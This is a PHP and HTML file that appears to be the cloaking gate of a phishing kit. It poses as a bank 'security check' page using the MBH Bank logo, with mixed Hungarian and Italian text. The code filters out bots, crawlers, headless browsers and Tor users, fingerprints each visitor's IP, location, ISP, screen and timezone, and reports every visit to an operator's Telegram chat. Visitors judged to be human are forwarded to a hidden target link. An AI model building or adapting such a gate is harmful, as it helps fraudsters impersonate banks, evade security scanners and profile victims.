<?php
session_start();
include 'YOUR-CONFIG.php';

// Initialize session
$_SESSION['page_load_time'] = time();
$_SESSION['js_enabled'] = false;
$_SESSION['mouse_moved'] = false;
$_SESSION['screen_resolution'] = '';
$_SESSION['timezone'] = '';
$_SESSION['ip'] = getRealIpAddr();

// Get location data
$location = getLocationFromIP($_SESSION['ip']);
if ($location) {
    $_SESSION['country'] = $location['country'];
    $_SESSION['countrycode'] = $location['countryCode'];
    $_SESSION['city'] = $location['city'];
    $_SESSION['isp'] = $location['isp'];
    $_SESSION['org'] = $location['org'];
} else {
    $_SESSION['country'] = 'Unknown';
    $_SESSION['countrycode'] = 'XX';
    $_SESSION['city'] = 'Unknown';
    $_SESSION['isp'] = 'Unknown';
    $_SESSION['org'] = 'Unknown';
}

// Check if already verified
if (isset($_SESSION['verified']) && $_SESSION['verified'] === true) {
    header("Location: " . $link);
    exit;
}

// Check for immediate bot blocks
if (isBotUserAgent() || isHeadlessBrowser() || isWebCrawler() || hasAutomationHeaders()) {
    $message = "🤖 <b>BOT BLOCKED - Immediate Detection</b>

";
    $message .= "🌐 IP: " . $_SESSION['ip'] . "
";
    $message .= "📍 Location: " . $_SESSION['country'] . "/" . $_SESSION['city'] . "
";
    $message .= "🏴 Country Code: " . $_SESSION['countrycode'] . "
";
    $message .= "🔧 ISP: " . $_SESSION['isp'] . "
";
    $message .= "🏢 Org: " . $_SESSION['org'] . "
";
    $message .= "💻 Browser: " . getBrowser() . "
";
    $message .= "🖥️ OS: " . getOs() . "
";
    $message .= "📱 User Agent: " . substr($_SERVER['HTTP_USER_AGENT'], 0, 100) . "...
";
    $message .= "⚠️ Detection: Bot User Agent / Headless / Crawler
";
    $message .= "⏰ Time: " . date('Y-m-d H:i:s') . "
";

    sendTelegram($message, $token_forVISITOR, $token_chatid_VISITOR);

    header("Location: " . $redirect_to);
    exit;
}

// Check Tor
if (isTorExitNode()) {
    $message = "🧅 <b>TOR USER BLOCKED</b>

";
    $message .= "🌐 IP: " . $_SESSION['ip'] . "
";
    $message .= "📍 Exit Node Detected
";
    $message .= "⏰ Time: " . date('Y-m-d H:i:s') . "
";

    sendTelegram($message, $token_forVISITOR, $token_chatid_VISITOR);

    header("Location: " . $redirect_to);
    exit;
}

// Calculate initial risk score
$initial_score = calculateRiskScore();

// Process reCAPTCHA submission
$error = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['g-recaptcha-response'])) {

    // Verify reCAPTCHA
    if (verifyRecaptcha($_POST['g-recaptcha-response'], $recaptcha_secret)) {

        // Update session with behavior data
        if (isset($_POST['js_check']) && $_POST['js_check'] == '1') {
            $_SESSION['js_enabled'] = true;
        }

        if (isset($_POST['mouse_moved']) && $_POST['mouse_moved'] == '1') {
            $_SESSION['mouse_moved'] = true;
        }

        if (isset($_POST['screen_resolution']) && !empty($_POST['screen_resolution'])) {
            $_SESSION['screen_resolution'] = $_POST['screen_resolution'];
        }

        if (isset($_POST['timezone']) && !empty($_POST['timezone'])) {
            $_SESSION['timezone'] = $_POST['timezone'];
        }

        // Recalculate risk score with new data
        $final_score = calculateRiskScore();

        // Check if still bot after captcha
        if ($final_score >= intval($max_fraud_score)) {
            $message = "🚫 <b>BOT DETECTED - Post CAPTCHA</b>

";
            $message .= "🌐 IP: " . $_SESSION['ip'] . "
";
            $message .= "📍 Location: " . $_SESSION['country'] . "/" . $_SESSION['city'] . "
";
            $message .= "🏴 Country Code: " . $_SESSION['countrycode'] . "
";
            $message .= "🔧 ISP: " . $_SESSION['isp'] . "
";
            $message .= "🏢 Org: " . $_SESSION['org'] . "
";
            $message .= "💻 Browser: " . getBrowser() . "
";
            $message .= "🖥️ OS: " . getOs() . "
";
            $message .= "📊 Risk Score: " . $final_score . "/" . $max_fraud_score . "
";
            $message .= "⚠️ JS Enabled: " . ($_SESSION['js_enabled'] ? 'Yes' : 'No') . "
";
            $message .= "⚠️ Mouse Moved: " . ($_SESSION['mouse_moved'] ? 'Yes' : 'No') . "
";
            $message .= "⚠️ Screen: " . $_SESSION['screen_resolution'] . "
";
            $message .= "⚠️ Timezone: " . $_SESSION['timezone'] . "
";
            $message .= "📝 Reason: Suspicious behavior after CAPTCHA
";
            $message .= "⏰ Time: " . date('Y-m-d H:i:s') . "
";

            sendTelegram($message, $token_forVISITOR, $token_chatid_VISITOR);

            header("Location: " . $redirect_to);
            exit;
        }

        // HUMAN VERIFIED
        $_SESSION['verified'] = true;

        $message = "✅ <b>HUMAN VERIFIED SUCCESSFULLY</b>

";
        $message .= "🌐 IP: " . $_SESSION['ip'] . "
";
        $message .= "📍 Location: " . $_SESSION['country'] . "/" . $_SESSION['city'] . "
";
        $message .= "🏴 Country Code: " . $_SESSION['countrycode'] . "
";
        $message .= "🔧 ISP: " . $_SESSION['isp'] . "
";
        $message .= "🏢 Org: " . $_SESSION['org'] . "
";
        $message .= "💻 Browser: " . getBrowser() . "
";
        $message .= "🖥️ OS: " . getOs() . "
";
        $message .= "📊 Risk Score: " . $final_score . "/" . $max_fraud_score . "
";
        $message .= "🖥️ Resolution: " . $_SESSION['screen_resolution'] . "
";
        $message .= "🌍 Timezone: " . $_SESSION['timezone'] . "
";
        $message .= "✅ JS: Yes | Mouse: Yes
";
        $message .= "⏰ Time: " . date('Y-m-d H:i:s') . "
";

        sendTelegram($message, $token_forVISITOR, $token_chatid_VISITOR);

        header("Location: " . $link);
        exit;

    } else {
        $error = "❌ reCAPTCHA verification failed. Please try again.";

        // Send failed attempt notification
        $message = "⚠️ <b>Failed CAPTCHA Attempt</b>

";
        $message .= "🌐 IP: " . $_SESSION['ip'] . "
";
        $message .= "📍 Location: " . $_SESSION['country'] . "/" . $_SESSION['city'] . "
";
        $message .= "⏰ Time: " . date('Y-m-d H:i:s') . "
";

        sendTelegram($message, $token_forVISITOR, $token_chatid_VISITOR);
    }
}

// Generate CSRF token
$csrf_token = generateCSRF();
?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Biztonsági ellenőrzés</title>
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: #f8f9fa;
            color: #333333;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(180deg, rgba(255,255,255,0.8) 0%, rgba(245,245,245,0.4) 50%, rgba(255,255,255,0.8) 100%),
                        url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect fill="%23f8f9fa" width="100" height="100"/><circle fill="%23e5e5e5" cx="20" cy="20" r="1.5" opacity="0.6"/><circle fill="%23e5e5e5" cx="50" cy="50" r="1.5" opacity="0.6"/><circle fill="%23e5e5e5" cx="80" cy="30" r="1.5" opacity="0.6"/><circle fill="%23e5e5e5" cx="30" cy="70" r="1.5" opacity="0.6"/><circle fill="%23e5e5e5" cx="70" cy="80" r="1.5" opacity="0.6"/></svg>');
            background-size: cover, 200px 200px;
            z-index: -1;
        }

        .container {
            background: #ffffff;
            padding: 50px 40px;
            border-radius: 8px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
            text-align: center;
            max-width: 450px;
            width: 100%;
            position: relative;
            border: 1px solid #e2e8f0;
        }

        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: #E50914;
            border-top-left-radius: 8px;
            border-top-right-radius: 8px;
        }

        .logo {
            margin: 0 auto 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo-img {
            max-width: 180px;
            max-height: 60px;
            width: auto;
            height: auto;
            object-fit: contain;
        }

        h1 {
            color: #111111;
            margin-bottom: 12px;
            font-size: 26px;
            font-weight: 600;
            letter-spacing: -0.5px;
        }

        .subtitle {
            color: #666666;
            margin-bottom: 35px;
            line-height: 1.6;
            font-size: 15px;
            font-weight: 400;
        }

        .g-recaptcha {
            display: inline-block;
            margin: 25px 0;
            transform-origin: center;
        }

        .submit-btn {
            background: #E50914;
            color: #ffffff;
            border: none;
            padding: 16px 50px;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            margin-top: 25px;
            width: 100%;
            letter-spacing: 0.3px;
        }

        .submit-btn:hover:not(:disabled) {
            background: #f40612;
            transform: translateY(-1px);
            box-shadow: 0 4px 15px rgba(229, 9, 20, 0.3);
        }

        .submit-btn:disabled {
            background: #e0e0e0;
            color: #999999;
            cursor: not-allowed;
            box-shadow: none;
        }

        .error {
            color: #dc3545;
            margin: 20px 0;
            padding: 15px;
            background: #f8d7da;
            border-radius: 4px;
            border-left: 4px solid #dc3545;
            display: <?php echo $error ? 'block' : 'none'; ?>;
            font-size: 14px;
        }

        .loading {
            display: none;
            margin-top: 25px;
            color: #555555;
        }

        .spinner {
            border: 3px solid rgba(0,0,0,0.1);
            border-top: 3px solid #E50914;
            border-radius: 50%;
            width: 35px;
            height: 35px;
            animation: spin 1s linear infinite;
            margin: 0 auto 12px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .security-info {
            margin-top: 30px;
            padding-top: 25px;
            border-top: 1px solid #eeeeee;
            font-size: 12px;
            color: #888888;
        }

        .security-info p {
            margin-bottom: 6px;
        }

        .risk-indicator {
            display: inline-block;
            padding: 6px 18px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .risk-low { 
            background: #e8f5e9; 
            color: #2e7d32; 
        }
        .risk-medium { 
            background: #fff8e1; 
            color: #f57f17; 
        }
        .risk-high { 
            background: #ffebee; 
            color: #c62828; 
        }

        .ip-info {
            background: #f1f5f9;
            padding: 15px;
            border-radius: 4px;
            margin: 20px 0;
            font-size: 13px;
            color: #475569;
            border: 1px solid #e2e8f0;
        }

        .ip-info strong {
            color: #0f172a;
            font-weight: 600;
        }

        @media (max-width: 480px) {
            .container {
                padding: 35px 25px;
            }

            h1 {
                font-size: 22px;
            }

            .g-recaptcha {
                transform: scale(0.9);
            }

            .logo-img {
                max-width: 140px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <!-- PNG Logo Placeholder: Replace src with your PNG link -->
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/ee/MBH_Bank_Logo_2023.svg" alt="Logo" class="logo-img">
        </div>
        <h1>Verifica di Sicurezza</h1>
        <p class="subtitle">A fenntartott terület eléréséhez töltse ki az alábbi ellenőrzést.</p>

        <?php if ($error): ?>
            <div class="error"><?php echo htmlspecialchars($error); ?></div>
        <?php endif; ?>

        <div class="ip-info">
            <strong>Tuo IP:</strong> <?php echo $_SESSION['ip']; ?> | 
            <strong>Posizione:</strong> <?php echo $_SESSION['city'] . ', ' . $_SESSION['country']; ?>
        </div>

        <form id="verifyForm" method="POST" action="">
            <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">

            <!-- Honeypot field - bots will fill this, humans won't -->
            <div style="display: none;">
                <input type="text" name="website" id="website" value="">
            </div>

            <!-- Hidden fields for bot detection -->
            <input type="hidden" name="js_check" id="js_check" value="0">
            <input type="hidden" name="mouse_moved" id="mouse_moved" value="0">
            <input type="hidden" name="screen_resolution" id="screen_resolution" value="">
            <input type="hidden" name="timezone" id="timezone" value="">
            <input type="hidden" name="load_time" id="load_time" value="<?php echo time(); ?>">

            <div class="g-recaptcha" 
                 data-sitekey="<?php echo $recaptcha_site_key; ?>"
                 data-callback="enableSubmit"
                 data-expired-callback="disableSubmit">
            </div>

            <br>
            <button type="submit" class="submit-btn" id="submitBtn" disabled>
                <span id="btnText">Ellenőrizd és folytasd</span>
            </button>
        </form>

        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>A kérelem ellenőrzése folyamatban van...</p>
        </div>

        <div class="security-info">
            <p>🔒 Fejlett Anti-Bot rendszerrel védve</p>
        </div>
    </div>

    <script>
        // Anti-bot detection - JavaScript checks
        document.getElementById('js_check').value = '1';

        // Track mouse movement
        let mouseMoved = false;
        let mouseMoveCount = 0;
        document.addEventListener('mousemove', function(e) {
            if (!mouseMoved) {
                mouseMoved = true;
                document.getElementById('mouse_moved').value = '1';
            }
            mouseMoveCount++;
        });

        // Track clicks
        let clickCount = 0;
        document.addEventListener('click', function() {
            clickCount++;
        });

        // Get screen resolution
        document.getElementById('screen_resolution').value = window.screen.width + 'x' + window.screen.height + 'x' + window.screen.colorDepth;

        // Get timezone
        try {
            document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
        } catch(e) {
            document.getElementById('timezone').value = 'unknown';
        }

        // Check for automation
        let automationFlags = [];

        if (navigator.webdriver) {
            automationFlags.push('webdriver');
        }

        if (navigator.plugins.length === 0) {
            automationFlags.push('no_plugins');
        }

        if (!navigator.languages || navigator.languages.length === 0) {
            automationFlags.push('no_languages');
        }

        // Enable submit when reCAPTCHA completed
        function enableSubmit() {
            document.getElementById('submitBtn').disabled = false;
            document.getElementById('btnText').textContent = 'Verifica e Continua';
        }

        // Disable when expired
        function disableSubmit() {
            document.getElementById('submitBtn').disabled = true;
            document.getElementById('btnText').textContent = 'Completa il reCAPTCHA';
        }

        // Form submission
        document.getElementById('verifyForm').addEventListener('submit', function(e) {
            if (document.getElementById('website').value !== '') {
                e.preventDefault();
                alert('Bot rilevato!');
                return false;
            }

            document.getElementById('loading').style.display = 'block';
            document.getElementById('submitBtn').disabled = true;
            document.getElementById('btnText').textContent = 'Verifica in corso...';
        });

        let pageLoadTime = Date.now();
        window.addEventListener('beforeunload', function() {
            let timeSpent = Date.now() - pageLoadTime;
            console.log('Time spent: ' + timeSpent + 'ms');
        });

        if (/HeadlessChrome/.test(window.navigator.userAgent)) {
            console.log('Headless detected');
        }

        if (window.self !== window.top) {
            console.log('In iframe');
        }
    </script>
</body>
</html>